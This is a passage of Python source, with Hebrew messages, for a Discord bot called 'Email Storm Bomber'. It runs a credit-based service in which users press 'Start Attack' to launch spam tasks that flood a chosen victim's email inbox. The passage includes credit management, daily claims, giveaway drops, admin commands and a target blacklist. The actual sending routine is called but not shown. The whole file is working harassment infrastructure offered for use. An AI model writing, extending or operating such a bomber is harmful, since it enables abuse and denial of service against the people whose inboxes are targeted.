async def on_ready():
    print(f"💥 Email Storm Bomber Ready! Logged in as {bot.user}")

@bot.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.type != discord.InteractionType.component:
        return
    custom_id = interaction.data.get("custom_id", "")
    if custom_id == "my_credits":
        snap = db.reference(f"users/{interaction.user.id}").get()
        credits_val = snap.get("credits", "0") if snap else "0"
        await interaction.response.send_message(f"💰 יתרה נוכחית: **{credits_val}** קרדיטים", ephemeral=True)
    elif custom_id == "spam_email":
        await interaction.response.send_modal(SpamEmailModal())
    elif custom_id == "daily_claim_btn":
        user_ref = db.reference(f"users/{interaction.user.id}")
        snap = user_ref.get()
        cur_credits = snap.get("credits", "0") if snap else "0"
        last_claim = snap.get("last_claim", 0) if snap else 0
        now_timestamp = int(time.time())
        cooldown_seconds = 24 * 3600
        if now_timestamp - last_claim < cooldown_seconds:
            remaining_seconds = cooldown_seconds - (now_timestamp - last_claim)
            hours, remainder = divmod(remaining_seconds, 3600)
            minutes, _ = divmod(remainder, 60)
            cooldown_embed = discord.Embed(
                title="⏳ Already claimed today",
                description=f"Come back in **{hours}h {minutes}m**",
                color=discord.Color.from_rgb(47, 49, 54)
            )
            return await interaction.response.send_message(embed=cooldown_embed, ephemeral=True)
        if cur_credits != "lifetime":
            try:
                curr_int = int(cur_credits or 0)
            except ValueError:
                curr_int = 0
            new_credits = str(curr_int + 5)
            user_ref.update({"credits": new_credits, "last_claim": now_timestamp})
            balance_text = f"New balance: **{new_credits}** credits"
        else:
            user_ref.update({"last_claim": now_timestamp})
            balance_text = "Your balance is **Lifetime**"
        success_embed = discord.Embed(
            title="🎁 +5 Credits!",
            description=f"{balance_text}\nCome back tomorrow!",
            color=discord.Color.from_rgb(47, 49, 54)
        )
        await interaction.response.send_message(embed=success_embed, ephemeral=True)
    elif custom_id.startswith("claim_"):
        await interaction.response.defer(ephemeral=True)
        d_id = custom_id.split("_")[1]
        drop = activeDrops.get(d_id)
        if not drop:
            return await interaction.followup.send("❌ דרופ זה פג תוקף או לא קיים יותר", ephemeral=True)
        if interaction.user.id in drop["claimed"]:
            return await interaction.followup.send("❌ כבר אספת את הדרופ הזה!", ephemeral=True)
        drop["claimed"].append(interaction.user.id)
        ref = db.reference(f"users/{interaction.user.id}")
        snap = ref.get()
        cur = snap.get("credits", "0") if snap else "0"
        if cur != "lifetime":
            try:
                curr_int = int(cur or 0)
            except ValueError:
                curr_int = 0
            ref.update({"credits": str(curr_int + drop["amount"])})
        await send_detailed_log("🎁 Drop claimed", interaction.user, [{"name": "Amount:", "value": str(drop["amount"])}], color=0x2ECC71)
        if len(drop["claimed"]) >= drop["winners"]:
            activeDrops.pop(d_id, None)
            await interaction.message.edit(content="🎉 Drop complete!", embed=None, view=None)
        else:
            embed = interaction.message.embeds[0]
            embed.set_field_at(0, name="Remaining winners:", value=str(drop["winners"] - len(drop["claimed"])))
            await interaction.message.edit(embed=embed)
        await interaction.followup.send(f"✅ You earned **{drop['amount']}** credits!", ephemeral=True)
    elif custom_id.startswith("confirm_"):
        allowed_user_id = int(custom_id.split("_")[1])
        if interaction.user.id != allowed_user_id:
            return await interaction.response.send_message("❌ This button is not for you", ephemeral=True)
        req = tempRequests.pop(interaction.user.id, None)
        if not req:
            return await interaction.response.send_message("❌ Request expired, please try again", ephemeral=True)
        blocked = db.reference(f"blacklist/{req['email']}").get()
        if blocked:
            return await interaction.response.send_message("❌ Email is blocked", ephemeral=True)
        await interaction.response.edit_message(content=f"🌪️ Starting spam for **{req['email']}**...", view=None)
        task = asyncio.create_task(_run_spam_task(interaction, interaction.user.id, req['email'], int(req['amount']), req['current']))
        active_spam_tasks[interaction.user.id] = task

@bot.tree.command(name="send_daily", description="שליחת הודעת הפרס היומי לערוץ")
async def send_daily_command(interaction: discord.Interaction):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    embed = discord.Embed(
        title="🎁 Daily Claim",
        description="לחצו על הכפתור למטה כדי לקבל **5 קרדיטים** בחינם בכל 24 שעות!",
        color=discord.Color.from_rgb(47, 49, 54)
    )
    await interaction.response.send_message(embed=embed, view=DailyCreditView())

@bot.tree.command(name="setup", description="לוח בקרה")
async def setup(interaction: discord.Interaction):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    embed = discord.Embed(title="Storm Bomber Email", description="💣 **Control panel**\nUse the buttons below", color=0x2b2d31)
    view = discord.ui.View()
    btn_attack = discord.ui.Button(label="Start Attack 🚀", style=discord.ButtonStyle.danger, custom_id="spam_email")
    btn_credits = discord.ui.Button(label="Credits 💰", style=discord.ButtonStyle.secondary, custom_id="my_credits")
    view.add_item(btn_attack)
    view.add_item(btn_credits)
    await interaction.response.send_message(embed=embed, view=view)
    await send_detailed_log("⚙️ Email Setup", interaction.user, [{"name": "Action:", "value": "Opened email control panel"}], color=0x2b2d31)

@bot.tree.command(name="cancel_spam", description="בטל ספאם פעיל שנמצא בתהליך")
async def cancel_spam(interaction: discord.Interaction):
    task = active_spam_tasks.pop(interaction.user.id, None)
    if task is None:
        return await interaction.response.send_message("אין ספאם פעיל לביטול.", ephemeral=True)
    task.cancel()
    await interaction.response.send_message("מבצע ביטול של הספאם. הריצה נעצרה.", ephemeral=True)

@bot.tree.command(name="add", description="הוספת קרדיטים למשתמש ספציפי (כולל lifetime) או לכל המשתמשים בבת אחת")
@app_commands.choices(target_type=[
    app_commands.Choice(name="משתמש ספציפי", value="single"),
    app_commands.Choice(name="כל המשתמשים ב-Firebase", value="all"),
])
async def add_credits(interaction: discord.Interaction, target_type: str, amount: str, user: discord.User = None):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    if target_type == "all":
        if amount.lower() == "lifetime":
            return await interaction.followup.send("❌ לא ניתן להעניק סטטוס Lifetime לכל המשתמשים בבת אחת! אנא הזן מספר.", ephemeral=True)
        try:
            add_int = int(amount)
            if add_int <= 0:
                return await interaction.followup.send("❌ יש להזין כמות קרדיטים גדולה מ-0", ephemeral=True)
        except ValueError:
            return await interaction.followup.send("❌ עבור הוספה לכל המשתמשים יש להזין מספר תקין בלבד.", ephemeral=True)
        users_ref = db.reference("users")
        try:
            all_users = users_ref.get()
        except Exception:
            all_users = None

        if all_users is None:
            all_users = {}

        for uid, data in all_users.items():
            try:
                if data.get("credits") != "lifetime":
                    current = int(data.get("credits", "0") or 0)
                    users_ref.child(uid).update({"credits": str(current + add_int)})
            except Exception:
                pass
        return await interaction.followup.send("✅ קרדיטים נוספו לכל המשתמשים.", ephemeral=True)
    if target_type == "single":
        if not user:
            return await interaction.followup.send("❌ יש לבחור משתמש בעת בחירת משתמש ספציפי.", ephemeral=True)
        if amount.lower() == "lifetime":
            db.reference(f"users/{user.id}").update({"credits": "lifetime"})
            return await interaction.followup.send(f"✅ הוספתי ל-**{user}** סטטוס lifetime.", ephemeral=True)
        try:
            add_int = int(amount)
            if add_int <= 0:
                raise ValueError
        except ValueError:
            return await interaction.followup.send("❌ יש להזין מספר קרדיטים חוקי.", ephemeral=True)
        ref = db.reference(f"users/{user.id}")
        snap = ref.get() or {}
        current = int(snap.get("credits", "0") or 0) if snap.get("credits") != "lifetime" else None
        if current is None:
            ref.update({"credits": "lifetime"})
            message = "✅ למשתמש כבר היה lifetime, נשאר כך."
        else:
            ref.update({"credits": str(current + add_int)})
            message = f"✅ הוספתי {add_int} קרדיטים ל-**{user}**."
        await interaction.followup.send(message, ephemeral=True)

@bot.tree.command(name="check_credits", description="בדיקת כמות קרדיטים של משתמש")
@app_commands.describe(user="המשתמש שאתה רוצה לבדוק")
async def check_credits(interaction: discord.Interaction, user: discord.Member):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ אין לך הרשאה להשתמש בפקודה זו", ephemeral=True)
    try:
        ref = db.reference(f"users/{user.id}/credits")
        credits = ref.get()
        if credits is None:
            credits = 0
        await interaction.response.send_message(f"💰 למשתמש {user.mention} יש **{credits}** קרדיטים.", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"❌ אירעה שגיאה בבדיקת הקרדיטים: {e}", ephemeral=True)

@bot.tree.command(name="set", description="קביעת יתרה")
async def set_credits(interaction: discord.Interaction, u: discord.User, a: str):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    if a.lower() != "lifetime":
        try:
            int(a)
        except ValueError:
            return await interaction.followup.send("❌ נא להזין מספר תקין או 'lifetime'", ephemeral=True)
    ref = db.reference(f"users/{u.id}")
    ref.update({"credits": a})
    await interaction.followup.send(f"✅ היתרה של {u.name} נקבעה ל-{a}", ephemeral=True)
    await send_detailed_log("⚙️ קביעת יתרה קבועה", interaction.user, [
        {"name": "יעד:", "value": u.mention},
        {"name": "יתרה שנקבעה:", "value": a}
    ], color=0x3498DB)

@bot.tree.command(name="blacklist", description="חסימת מספר")
async def blacklist(interaction: discord.Interaction, p: str):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    db.reference(f"blacklist/{p}").set(True)
    await interaction.followup.send(f"✅ בוצע על {p}", ephemeral=True)
    await send_detailed_log("🚫 חסימת מספר (Blacklist)", interaction.user, [{"name": "מספר שנחסם:", "value": p}], color=0xE74C3C)

@bot.tree.command(name="remove", description="הסרת חסימה")
async def remove_blacklist(interaction: discord.Interaction, p: str):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    db.reference(f"blacklist/{p}").delete()
    await interaction.followup.send(f"✅ בוצע על {p}", ephemeral=True)
    await send_detailed_log("🔓 הסרת חסימה", interaction.user, [{"name": "מספר שהוסר:", "value": p}], color=0xF1C40F)

@bot.tree.command(name="blacklist_list", description="הצגת רשימת החסומים")
async def blacklist_list(interaction: discord.Interaction):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    snap = db.reference("blacklist").get()
    list_str = "\n".join(snap.keys()) if snap else "ריק"
    await interaction.followup.send(f"**חסומים:**\n{list_str}", ephemeral=True)

@bot.tree.command(name="drop", description="דרופ קרדיטים")
async def drop_credits(interaction: discord.Interaction, a: int, w: int):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    d_id = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=7))
    activeDrops[d_id] = {"amount": a, "winners": w, "claimed": []}
    embed = discord.Embed(title="🎉 Credit Drop!", description=f"הראשונים שילחצו יקבלו **{a}** קרדיטים!", color=0x5865F2)
    embed.add_field(name="זוכים שנשארו:", value=str(w))
    view = discord.ui.View()
    btn_claim = discord.ui.Button(label="Claim 🎁", style=discord.ButtonStyle.success, custom_id=f"claim_{d_id}")
    view.add_item(btn_claim)
    await interaction.response.send_message(embed=embed, view=view)
    await send_detailed_log("🎁 יצירת דרופ קרדיטים", interaction.user, [
        {"name": "כמות לכל זוכה:", "value": str(a)},
        {"name": 'סה"כ זוכים מוגדרים:', "value": str(w)}
    ], color=0x9B59B6)
@bot.tree.command(name="ping", description="בודק אם הבוט מגיב")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message("פונג! הבוט עובד חלק! 🏓", ephemeral=True)

@bot.tree.command(name="leaderboard", description="הצגת טבלת מובילים (מנהלים בלבד)")
@app_commands.describe(count="כמה משתמשים להציג בטופ")
@app_commands.checks.has_permissions(administrator=True)
async def leaderboard(interaction: discord.Interaction, count: int = 10):
    await interaction.response.defer(ephemeral=False)
    users_ref = db.reference("users")
    all_users = users_ref.get()
    if not all_users:
        return await interaction.followup.send("❌ אין נתונים בשרת.", ephemeral=True)
    leaderboard_data = []
    for u_id, u_data in all_users.items():
        credits_val = u_data.get("credits", "0")
        if credits_val != "lifetime":
            try:
                leaderboard_data.append({"id": u_id, "credits": int(credits_val)})
            except ValueError:
                continue
    leaderboard_data.sort(key=lambda x: x["credits"], reverse=True)
    top_users = leaderboard_data[:count]
    embed = discord.Embed(title="🏆 טבלת מובילי הקרדיטים 🏆", color=discord.Color.gold())
    rank_text = ""
    for i, user_data in enumerate(top_users, 1):
        user = bot.get_user(int(user_data["id"]))
        user_name = user.name if user else f"משתמש {user_data['id']}"
        rank_text += f"{i}. **{user_name}**: {user_data['credits']} קרדיטים\n"
    embed.description = rank_text
    await interaction.followup.send(content="||@everyone||", embed=embed)

@leaderboard.error
async def leaderboard_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("❌ רק מנהלים יכולים להריץ פקודה זו.", ephemeral=True)

if __name__ == "__main__":
    bot.run(os.getenv("DISCORD_TOKEN"))
